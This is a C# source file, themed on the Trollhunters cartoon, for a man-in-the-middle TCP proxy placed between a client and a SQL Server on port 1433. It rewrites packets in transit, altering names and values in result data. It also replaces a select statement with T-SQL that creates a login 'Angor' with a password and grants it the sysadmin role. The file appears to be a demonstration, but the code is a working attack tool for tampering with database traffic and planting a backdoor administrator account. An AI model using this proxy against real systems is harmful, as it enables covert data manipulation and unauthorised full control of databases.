// +--------------------------------------------+
// | Trollhunters - Angor - Releases the Pixies |
// +--------------------------------------------+

using System;
using System.Text;
using System.Net;
using System.Net.Sockets;

namespace Pixies
{
    class Pixies
    {
        static void Main(string[] args)
        {
            // +----------------+
            // | Pixies Control |
            // +----------------+

            String Param_Source_IP = "127.0.0.1";        // Pixies.
            String Param_Source_Port = "10101";          // Pixies port to proxy.
            String Param_Destination_IP = "127.0.0.1";   // Target.
            String Param_Destination_Port = "1433";      // Target port.

            // +----------------+
            // | Pixies Release |
            // +----------------+

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("\r\n"
                            + "+--------------------------------------------+\r\n"
                            + "| Trollhunters - Angor - Releases the Pixies |\r\n"
                            + "+--------------------------------------------+\r\n"
                            + "1101100000111011000010000001100011100111001000111101011000001110110101110100101010111010010001011110011010011010010000\r\n"
                            + "1101000001110101000011101000000111011001101010110011011011000110111110101100111101111011110010111101011110100110110110\r\n"
                            + "0011100011100101010001101111100000001000100110000001100011001110101101101101001100001010011100011100100010010110110111\r\n"
                            + "1110101010000000110001100000010010111100110111101011010111001100101000101011110110101010000010000010100010010100101001\r\n"
                            + "1000111110011100111000101010110011101110000110101110011010010001101010000111101100001101010101101100101111000111011001\r\n"
                            + "1011001011101000001101001100000001110010101100110110001000110000101100000111010001111101010111111000110101101011100011\r\n"
                            + "1111000010011011000010111010111011110110001111010001111010110111111100100000011001011000110101010101101100111101010110\r\n"
                            + "0010100010000001110010111111001100100011011111011101100100000110010010111000111111001011111000010001011100101000010000\r\n"
                            + "0100100010011011100011011000011111111011100001001111000100100011110000100100011110100001010111110100010010101111101100\r\n"
                            + "0111010001101111001010000111101111101111101110010110111110001001001100010000110011000111100010101011000010110001111000\r\n"
                            + "1111100010000111110100001000110111101100000110111110111001000001101111111101110101100000110011100111011001001001110110\r\n"
                            + "1011101011001011001001111111010100001110000000011111111111100110011000010011000110001011000001100001100100000000001101\r\n"
                            + "1011011010110111000110101010001101111010000111111111100001011010010100000101000000001011100101000001010110101100111100\r\n"
                            + "1011010110001110101101000111111100101011101000001101010000010000101110100110011101000111001010001100101110000111001100\r\n"
                             );

            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine("Pixies...");
            Console.WriteLine("Source      = " + Param_Source_IP + " : " + Param_Source_Port);
            Console.WriteLine("Destination = " + Param_Destination_IP + " : " + Param_Destination_Port);
            Console.WriteLine("--------------------------------------------------");

            // Start the proxy
            new TcpForwarderSlim().Start(new IPEndPoint(IPAddress.Parse(Param_Source_IP), int.Parse(Param_Source_Port)),
                                         new IPEndPoint(IPAddress.Parse(Param_Destination_IP), int.Parse(Param_Destination_Port))
                                        );
        } // Main()
    } // class Pixies

    public class TcpForwarderSlim
    {
        private readonly Socket MainSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        public void Start(IPEndPoint local, IPEndPoint remote)
        {
            Console.WriteLine("Start");
            MainSocket.Bind(local);
            MainSocket.Listen(10);

            while (true)
            {
                Console.WriteLine("Pre Accept");
                var source = MainSocket.Accept();
                Console.WriteLine("Post Accept");
                var destination = new TcpForwarderSlim();
                var state = new State(source, destination.MainSocket);
                destination.Connect(remote, source);
                source.BeginReceive(state.Buffer, 0, state.Buffer.Length, 0, OnDataReceive, state);
            }
        }

        private void Connect(EndPoint remoteEndpoint, Socket destination)
        {
            Console.WriteLine("Connect");
            var state = new State(MainSocket, destination);
            MainSocket.Connect(remoteEndpoint);
            MainSocket.BeginReceive(state.Buffer, 0, state.Buffer.Length, SocketFlags.None, OnDataReceive, state);
        } // Connect()

        private static void OnDataReceive(IAsyncResult result)
        {
            Console.Write("OnDataReceive: ");

            var state = (State)result.AsyncState;
            try
            {
                var bytesRead = state.SourceSocket.EndReceive(result);
                Console.WriteLine(bytesRead);
                if (bytesRead > 0)
                {
                    if (bytesRead > 250)
                    {
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine(Encoding.Default.GetString(state.Buffer, 0, bytesRead).Replace("\0", "¸"));
                        Console.ForegroundColor = ConsoleColor.Green;
                    }

                    if (bytesRead > 100)
                    {
                        // +----------------+
                        // | Pixies Targets |
                        // +----------------+

                        // Target 1
                        String FindString = "Alive";
                           String Exploit = "Dream"; // must have same length

                        ArrayReplace_ByteArray(state, StringToByteArray(FindString), StringToByteArray(Exploit), 0);

                        // Target 2
                        FindString = "Jim Lake Jr.";
                           Exploit = "Trollhunter "; // add space to fill

                        ArrayReplace_ByteArray(state, StringToByteArray(FindString), StringToByteArray(Exploit), 0);

                        // Target 3
                        FindString = "Coach";
                           Exploit = "Slimm"; 

                        ArrayReplace_ByteArray(state, StringToByteArray(FindString), StringToByteArray(Exploit), 0);
                        
                        // Target 4
                        byte[] FindBuffer = new byte[] { (byte) 'A', 0,
                                                            (byte) 'l', 0,
                                                            (byte) 'i', 0,
                                                            (byte) 'v', 0,
                                                            (byte) 'e', 0,
                                                            (byte) 0x38 // 56 int = 0x38 hex
                                                          };

                        byte[] ExploitBuffer = new byte[] { (byte) 'D', 0,
                                                            (byte) 'r', 0,
                                                            (byte) 'e', 0,
                                                            (byte) 'a', 0,
                                                            (byte) 'm', 0,
                                                            (byte) 0x10 // 16 int = 0x10 hex
                                                          };

                        ArrayReplace_ByteArray(state, FindBuffer, ExploitBuffer, 0);
                        
                        // Go in for the kill
                        FindString = "select 'Angor goes in for the kill'";
                           Exploit = "create login    Angor    WITH PASSWORD = 'Youre mine now. H4h4h4!'; "
                                   + "alter server role sysadmin add member      Angor      ; "
                                   + "select 'Angor is in the Highschool!', GetDate();  -- ";
                        
                        ArrayReplace_ByteArray(state, StringToByteArray(FindString), StringToByteArray(Exploit), 0);
                        
                        // Target 5 // this is how you do dates, int, etc. 
                        byte[] NameFind = new byte[] { (byte) 'A', 0,
                                                              (byte) 'l', 0,
                                                              (byte) 'i', 0,
                                                              (byte) 'v', 0,
                                                              (byte) 'e' };

                        byte[] NameReplace = new byte[] { (byte) 'D', 0,
                                                              (byte) 'r', 0,
                                                              (byte) 'e', 0,
                                                              (byte) 'a', 0,
                                                              (byte) 'm'};

                        ArrayReplace_ByteArray(state, NameFind, NameReplace, 0);

                        // +---------------+
                        // | Pixies Return |
                        // +---------------+
                    }

                    state.DestinationSocket.Send(state.Buffer, bytesRead, SocketFlags.None);
                    state.SourceSocket.BeginReceive(state.Buffer, 0, state.Buffer.Length, 0, OnDataReceive, state);
                }
            }
            catch
            {
                state.DestinationSocket.Close();
                state.SourceSocket.Close();
            }
        } // OnDataReceive()

        static int ArrayReplace_ByteArray(State ioState, byte[] inOriginal, byte[] inReplacement, int inOffset)
        {
            int FoundAt = ArraySearch(ioState.Buffer, inOriginal);
            if (FoundAt >= 0 && inReplacement != null)
            {
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Human Found >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
                Array.Copy(inReplacement, 0, ioState.Buffer, FoundAt + inOffset, inReplacement.Length);
                Console.WriteLine("Human Hallucinates <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<");
                Console.ForegroundColor = ConsoleColor.Cyan;
                System.Threading.Thread.Sleep(300); 
            }
            return (FoundAt);
        } // ArrayReplace_ByteArray()

        static byte[] StringToByteArray(String inString)
        {
            byte[] Out = new byte[inString.Length * 2];
            //System.Buffer.BlockCopy(str.ToCharArray(), 0, bytes, 0, bytes.Length);

            for (int n = 0; n < inString.Length; n++)
            {
                Out[n * 2] = (byte)inString[n];
                Out[n * 2 + 1] = 0;
            }
            return (Out);
        } // StringToByteArray()

        static int ArraySearch(byte[] haystack, byte[] needle)
        {
            for (int i = 0; i <= haystack.Length - needle.Length; i++)
            {
                if (ArrayMatch(haystack, needle, i))
                {
                    return i;
                }
            }
            return -1;
        } // ArraySearch()

        public static bool ArrayMatch(byte[] haystack, byte[] needle, int start)
        {
            if (needle.Length + start > haystack.Length)
            {
                return false;
            }
            else
            {
                for (int i = 0; i < needle.Length; i++)
                {
                    if (needle[i] != haystack[i + start])
                    {
                        return false;
                    }
                }
                return true;
            }
        } //ArrayMatch()

        private class State
        {
            public Socket SourceSocket { get; private set; }
            public Socket DestinationSocket { get; private set; }
            public byte[] Buffer { get; private set; }

            public State(Socket source, Socket destination)
            {
                SourceSocket = source;
                DestinationSocket = destination;
                Buffer = new byte[8192];
            } // State()
        } // private class State()

    } //  class TcpForwarderSlim

} // namespace Pixies
